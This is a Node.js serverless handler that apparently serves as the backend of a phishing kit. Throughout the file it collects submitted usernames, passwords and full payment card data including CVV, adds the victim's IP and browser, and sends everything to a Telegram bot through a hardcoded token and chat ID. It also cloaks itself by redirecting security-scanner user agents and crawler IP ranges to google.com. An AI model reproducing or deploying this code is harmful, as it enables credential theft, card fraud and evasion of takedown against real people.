const fetch = require('node-fetch');

// In-memory store for rate limiting (resets on function redeploy)
const requestCounts = new Map();

exports.handler = async (event) => {
  const telegramBotToken = '7686288445:AAEFKviKwOyJMRRqwI23qNkycvK6u7PZFeY';
  const telegramChatId = '7646336470';
  const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const ip = event.headers['client-ip'] || 'Unknown';
  const agent = event.headers['user-agent'] || 'Unknown';
  const time = new Date().toISOString();
  const data = JSON.parse(event.body);

  // Rate Limiting: Allow 5 requests per IP per minute
  const now = Math.floor(Date.now() / 60000); // Minute key
  const key = `${ip}:${now}`;
  const count = requestCounts.get(key) || 0;
  if (count >= 5) {
    return { statusCode: 429, body: 'Too Many Requests' };
  }
  requestCounts.set(key, count + 1);
  setTimeout(() => requestCounts.delete(key), 60000); // Clear after 1 minute

  // BabyBot Logic
  const agentsBlacklist = ['curl', 'wget', 'python-requests', 'node-fetch', 'PostmanRuntime', 'okhttp', 'Apache-HttpClient'];
  const ipsBlacklist = ['66.249.', '157.55.', '207.46.', '40.77.', '17.', '216.58.', '142.250.', '142.251.'];
  const lowerAgent = agent.toLowerCase();
  if (agentsBlacklist.some(bad => lowerAgent.includes(bad)) || ipsBlacklist.some(bad => ip.startsWith(bad))) {
    return { statusCode: 302, headers: { Location: 'https://google.com' } };
  }

  // Process Submission
  let message = `Hello Dark, New Data Received\n`;
  if (data.email_or_user && data.password) {
    message += `Type: Account Submission\n`;
    message += `Username: ${data.email_or_user}\n`;
    message += `Password: ${data.password}\n`;
  } else if (data.cardholder && data.cardnumber) {
    message += `Type: Payment Submission\n`;
    message += `Cardholder: ${data.cardholder}\n`;
    message += `Card: ${data.cardnumber}\n`;
    message += `Expiry: ${data.expiry}\n`;
    message += `CVV: ${data.cvv}\n`;
    message += `Address: ${data.address}\n`;
    message += `State: ${data.state}\n`;
    message += `Zip Code: ${data.zip}\n`;
    message += `Country: ${data.country}\n`;
  }
  message += `IP: ${ip}\nBrowser: ${agent}\nDate and time: ${time}`;

  await fetch(telegramUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ chat_id: telegramChatId, text: message })
  });

  return {
    statusCode: 200,
    body: data.cardholder ? 'payment_updated' : 'success'
  };
};